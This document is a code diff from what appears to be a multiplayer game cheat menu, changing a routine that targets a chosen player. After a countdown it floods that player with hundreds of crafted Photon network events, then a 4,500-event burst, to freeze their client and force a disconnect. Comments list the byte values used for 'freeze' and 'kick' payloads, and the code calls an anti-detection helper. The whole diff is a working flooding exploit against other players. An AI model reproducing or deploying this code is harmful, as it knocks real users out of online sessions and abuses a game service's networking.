@@ -8455,21 +8455,18 @@ namespace Quantum.Mods
             SerializePatch.OverrideSerialization = () => false;
             RPCProtection();
 
-            float startTime = Time.time;
+            // Stage 1: Freeze phase (Malachi Lag Logic)
             for (int i = 7; i > 0; i--)
             {
                 NotificationManager.SendNotification($"<color=grey>[</color><color=red>KICKING</color><color=grey>]</color> {name} in {i} seconds...", 1000);
                 
-                // Freeze phase (Lag packets) - Balanced frequency
-                int view = PhotonNetwork.AllocateViewID(0);
-                for (int j = 0; j < 250; j++)
+                // Content format: object[] { byte_val, float_val }
+                // Freeze values: 21, 23, 30, 31
+                object[] freezeContent = new object[] { (byte)23, 6.5f };
+
+                for (int j = 0; j < 350; j++)
                 {
-                    PhotonNetwork.NetworkingClient.OpRaiseEvent(202, new Hashtable
-                    {
-                        { 0, "GameMode" },
-                        { 6, PhotonNetwork.ServerTimestamp },
-                        { 7, view }
-                    }, new RaiseEventOptions
+                    PhotonNetwork.NetworkingClient.OpRaiseEvent(202, freezeContent, new RaiseEventOptions
                     {
                         TargetActors = new[] { target.ActorNumber }
                     }, SendOptions.SendReliable);
@@ -8478,18 +8475,15 @@ namespace Quantum.Mods
                 yield return new WaitForSeconds(1f);
             }
 
+            // Stage 2: Final Kick pulse (Malachi Disconnect Logic)
             NotificationManager.SendNotification($"<color=grey>[</color><color=red>KICK</color><color=grey>]</color> EXECUTING FINAL KICK!");
 
-            // Final Disconnect Burst
-            int finalView = PhotonNetwork.AllocateViewID(0);
-            for (int i = 0; i < 4000; i++)
+            // Kick values: 100, 140, 150
+            object[] kickContent = new object[] { (byte)150, 6.5f };
+
+            for (int i = 0; i < 4500; i++)
             {
-                PhotonNetwork.NetworkingClient.OpRaiseEvent(202, new Hashtable
-                {
-                    { 0, "GameMode" },
-                    { 6, PhotonNetwork.ServerTimestamp },
-                    { 7, finalView }
-                }, new RaiseEventOptions
+                PhotonNetwork.NetworkingClient.OpRaiseEvent(202, kickContent, new RaiseEventOptions
                 {
                     TargetActors = new[] { target.ActorNumber }
                 }, SendOptions.SendReliable);
